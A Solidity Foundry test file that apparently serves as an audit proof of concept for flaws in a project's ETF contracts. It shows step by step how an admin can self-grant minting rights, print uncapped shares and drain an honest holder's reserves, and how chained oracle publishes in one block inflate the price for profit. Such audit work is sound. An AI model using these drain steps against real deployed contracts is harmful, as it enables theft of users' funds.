// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IndexOracle} from "../src/IndexOracle.sol";
import {ETFFactory} from "../src/ETFFactory.sol";
import {ETFShare} from "../src/ETFShare.sol";
import {IssuanceVault} from "../src/IssuanceVault.sol";
import {MockMUSD} from "./mocks/MockMUSD.sol";

/**
 * Two paths that empty the reserve pot, neither of which needs the vault's
 * own admin key.
 *
 * Both exist because of one fact about OpenZeppelin's AccessControl that none
 * of these contracts overrides: `getRoleAdmin` defaults to
 * DEFAULT_ADMIN_ROLE for every role, and nothing calls `_setRoleAdmin`. So a
 * DEFAULT_ADMIN_ROLE holder can grant itself any other role on that same
 * contract. The role separation these contracts document - the key that
 * pushes prices cannot pause the feed, the treasurer cannot touch reserves -
 * is real between *distinct* keys and nominal against the admin.
 *
 * As with the flash-stake proof, these tests assert the CURRENT behaviour and
 * pass while the flaw is present.
 */
contract AdminTheftTest is Test {
    MockMUSD musd;
    IndexOracle oracle;
    ETFFactory factory;
    ETFShare share;
    IssuanceVault vault;

    address admin = makeAddr("admin");
    address publisher = makeAddr("publisher");
    address guardian = makeAddr("guardian");
    address treasury = makeAddr("treasury");
    address victim = makeAddr("honestHolder");

    uint256 constant ONE = 1e18;

    function setUp() public {
        vm.warp(1_700_000_000);
        musd = new MockMUSD(18);
        oracle = new IndexOracle("GOLOGGLE / MUSD", 8, 2000, 1 hours, admin, publisher, guardian);
        vm.prank(publisher);
        oracle.publish(100e8);

        factory = new ETFFactory(IERC20(address(musd)), admin);
        vm.prank(admin);
        factory.registerIndex("GOLOGGLE", oracle, 1 hours, 50, 5000, 1_000_000e18, guardian, treasury);
        (address s, address v) = factory.deployETF("Gologgle Index", "GOLOGGLE");
        share = ETFShare(s);
        vault = IssuanceVault(v);

        // An honest holder puts real MUSD in. This is the pot at risk.
        musd.mint(victim, 100_000e18);
        vm.startPrank(victim);
        musd.approve(address(vault), type(uint256).max);
        vault.buy(100_000e18, 0);
        vm.stopPrank();
    }

    /**
     * The share contract's admin can print shares and redeem them.
     *
     * Note which key this needs: `ETFShare`'s DEFAULT_ADMIN_ROLE, which
     * ETFFactory hands to the same `admin` it gives the vaults. It does NOT
     * need the vault's admin, and the vault's own comment claiming
     * "shareholder reserves are not reachable by any role" is false for this
     * reason - the reachable role is on the share token.
     */
    function test_theShareAdminMintsFromNothingAndDrainsTheReserves() public {
        uint256 reservesBefore = vault.reserves();
        assertGt(reservesBefore, 99_000e18, "the victim's MUSD is not in the vault");

        vm.startPrank(admin);
        // 1. Self-grant MINTER_ROLE. Permitted because getRoleAdmin(MINTER)
        //    defaults to DEFAULT_ADMIN_ROLE and nothing calls _setRoleAdmin.
        share.grantRole(share.MINTER_ROLE(), admin);

        // 2. Mint shares against no MUSD whatsoever. maxShares is checked in
        //    buy() only, never in mint(), so even the cap does not apply.
        uint256 price = vault.price();
        uint256 printed = (reservesBefore * ONE) / price;
        share.mint(admin, printed);

        // 3. Redeem them against the honest holder's reserves.
        share.approve(address(vault), printed);
        uint256 stolen = vault.redeem(printed, 0);
        vm.stopPrank();

        emit log_named_decimal_uint("reserves before          ", reservesBefore, 18);
        emit log_named_decimal_uint("shares printed for 0 MUSD", printed, 18);
        emit log_named_decimal_uint("MUSD taken by the admin  ", stolen, 18);
        emit log_named_decimal_uint("reserves after           ", vault.reserves(), 18);

        assertGt(stolen, 98_000e18, "the drain did not happen");
        assertEq(musd.balanceOf(admin), stolen);
        // The victim still holds shares, now backed by almost nothing.
        assertGt(share.balanceOf(victim), 0);
        assertLt(vault.reserves(), reservesBefore / 50);
    }

    function test_mintIgnoresTheShareCapEntirely() public {
        vm.startPrank(admin);
        share.grantRole(share.MINTER_ROLE(), admin);
        uint256 cap = vault.maxShares();
        // Ten times the cap the deployer chose as the only bound on exposure.
        share.mint(admin, cap * 10);
        vm.stopPrank();
        assertGt(share.totalSupply(), cap * 10, "the cap was somehow enforced");
    }

    /**
     * The 20% deviation bound is per round, and nothing requires time between
     * rounds. So it compounds per transaction rather than per hour, and the
     * guardian cannot react inside a single block.
     */
    function test_thePriceBoundCompoundsWithinOneBlockAndPaysTheAttacker() public {
        address attacker = makeAddr("attacker");
        musd.mint(attacker, 10_000e18);
        vm.startPrank(attacker);
        musd.approve(address(vault), type(uint256).max);
        uint256 shares = vault.buy(10_000e18, 0);
        vm.stopPrank();

        uint256 startPrice = vault.price();

        // The publisher key, or an admin that self-granted PUBLISHER_ROLE.
        // Five rounds, same block, each within 20% of its predecessor.
        vm.startPrank(publisher);
        int256 answer = 100e8;
        for (uint256 i = 0; i < 5; ++i) {
            answer = (answer * 12) / 10;
            oracle.publish(answer);
        }
        vm.stopPrank();

        uint256 endPrice = vault.price();
        emit log_named_decimal_uint("price at the start of the block", startPrice, 18);
        emit log_named_decimal_uint("price after five publishes     ", endPrice, 18);
        assertGt(endPrice * 100, startPrice * 240, "the price did not compound as expected");

        vm.startPrank(attacker);
        share.approve(address(vault), shares);
        uint256 out = vault.redeem(shares, 0);
        vm.stopPrank();

        emit log_named_decimal_uint("MUSD in                        ", 10_000e18, 18);
        emit log_named_decimal_uint("MUSD out, same block           ", out, 18);
        // Paid ~2.5x out of the honest holder's reserves.
        assertGt(out, 24_000e18, "the pump did not pay out");
    }

    function test_theAdminCanSelfGrantEveryRoleOnEveryContract() public {
        // The fact underneath both drains, asserted directly: no contract
        // calls _setRoleAdmin, so DEFAULT_ADMIN_ROLE administers every role.
        vm.startPrank(admin);
        share.grantRole(share.MINTER_ROLE(), admin);
        share.grantRole(share.BURNER_ROLE(), admin);
        oracle.grantRole(oracle.PUBLISHER_ROLE(), admin);
        oracle.grantRole(oracle.GUARDIAN_ROLE(), admin);
        vault.grantRole(vault.TREASURER_ROLE(), admin);
        vault.grantRole(vault.GUARDIAN_ROLE(), admin);
        vm.stopPrank();

        assertTrue(share.hasRole(share.MINTER_ROLE(), admin));
        assertTrue(oracle.hasRole(oracle.PUBLISHER_ROLE(), admin));
        assertTrue(vault.hasRole(vault.TREASURER_ROLE(), admin));
        // So "the key that pushes prices cannot pause the feed" holds only
        // between distinct non-admin keys.
        assertTrue(oracle.hasRole(oracle.GUARDIAN_ROLE(), admin));
    }
}
